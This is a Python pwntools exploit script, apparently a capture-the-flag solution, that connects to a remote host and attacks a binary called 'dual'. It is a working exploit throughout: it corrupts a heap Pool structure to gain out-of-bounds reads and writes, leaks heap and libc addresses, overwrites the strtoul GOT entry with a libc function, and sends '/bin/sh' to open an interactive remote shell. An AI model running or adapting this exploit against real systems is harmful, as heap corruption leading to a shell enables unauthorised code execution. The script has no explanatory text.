#-*- coding: utf-8 -*-
from pwn import *

#p = process("./dual")
p = remote("13.231.226.137",9573)

go = lambda x: p.sendlineafter(">",str(x))
go2 = lambda x: p.sendafter(">",str(x))

opcodes = ""

CREATE = "1"
CONNECT = "2"
DISCONNECT = "3"
WRITE_TEXT = "4"
WRITE_BIN = "5"
READ_TEXT = "6"
GC_RU = "7"

assert(len(opcodes) < 15)

go(WRITE_BIN)
go(0)
go(0)

go(CREATE) #1
go(0)

go(WRITE_TEXT) # free node1
go(0)
go(8)
go2("A"*8)


'''
struct __attribute__((aligned(8))) Pool
{
  __int64 curid;
  __int64 *b;
  __int64 *child_vector_start;
  __int64 *chlid_vector_end;
  __int64 *e;
  __int64 size;
  __int64 dataid;
  __int64 *h;
};

'''

pay = p64(1)
pay += p64(0)*4
pay += p64(0x600) #size
pay += p64(1)
pay = pay.ljust(0x40,"A")

go(WRITE_TEXT)
go(0)
go(0x40)
go2(pay)


go(CREATE) #2 extend pool area
go(0)

go(READ_TEXT)
go(1)

p.recvuntil(p64(0)+p64(0x31))
heap = u64(p.recv(8))

print('heap : ' + hex(heap))


pay2 = "A" * 0xa0
pay2 += p64(heap)
pay2 += p64(heap+0xb0)
pay2 += p64(0x519030) #stroul

pay = p64(1)
pay += p64(0)*4
pay += p64(len(pay2)) #size
pay += p64(1)
pay = pay.ljust(0x40,"A")

go(WRITE_TEXT)
go(0)
go(0x40)
go2(pay)


go(WRITE_TEXT)
go(1)
go(len(pay2))
go2(pay2)

#LEAK & EXPLOIT

pay = p64(1)
pay += p64(0)*4
pay += p64(9) #size
pay += p64(2) #free
pay = pay.ljust(0x40,"A")

go(WRITE_TEXT)
go(0)
go(0x40)
go2(pay)

go(READ_TEXT)
go(1)

libc = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x4bc60

print('libc :' + hex(libc)) 

go(WRITE_TEXT)
go(1)
go(8)
go2(p64(libc+0x55410))


go(1)
go("/bin/sh")
p.interactive()
